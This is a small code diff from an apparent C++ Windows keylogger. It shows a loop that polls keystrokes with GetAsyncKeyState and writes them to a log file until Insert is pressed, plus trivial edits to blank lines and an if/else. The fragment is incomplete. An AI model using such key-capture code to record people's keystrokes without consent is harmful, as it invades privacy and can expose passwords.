@@ -31,7 +31,6 @@ unsigned char KEY::keyPressed()
 
     else if (GetAsyncKeyState(VK_RETURN) & 1)
         return '\n';
-
     return 0;
 }
 void KEY::ReadKeys()
@@ -47,7 +46,7 @@ void KEY::ReadKeys()
             if (!FS::F_WriteToFile(&logger, key))
                 std::cout << "can't write to file!\n";
         }
-        if (GetAsyncKeyState(VK_INSERT) & 1)
+        else if (GetAsyncKeyState(VK_INSERT) & 1)
             break;
     }
 
